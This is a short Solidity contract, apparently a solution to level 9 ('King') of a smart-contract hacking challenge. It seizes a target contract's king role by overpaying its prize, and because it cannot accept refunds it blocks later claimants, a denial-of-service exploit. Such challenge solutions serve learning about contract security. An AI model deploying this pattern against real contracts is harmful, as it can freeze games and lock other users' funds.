// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external view returns (uint256);
}

// ================================================================
// │                         LEVEL 9 - KING                       │
// ================================================================
contract ClaimKing {
    constructor(address _targetContractAddress) payable {
        IKing king = IKing(_targetContractAddress);
        uint256 attackValue = king.prize() + 1 wei;
        if (attackValue > address(this).balance) revert("Not enough funds");

        // Attack contract
        (bool success,) = _targetContractAddress.call{value: attackValue}("");
        if (!success) revert("Call failed");

        // Refund remaining balance
        (bool refundSuccess,) = address(msg.sender).call{value: address(this).balance}("");
        if (!refundSuccess) revert("Refund call failed");
    }
}
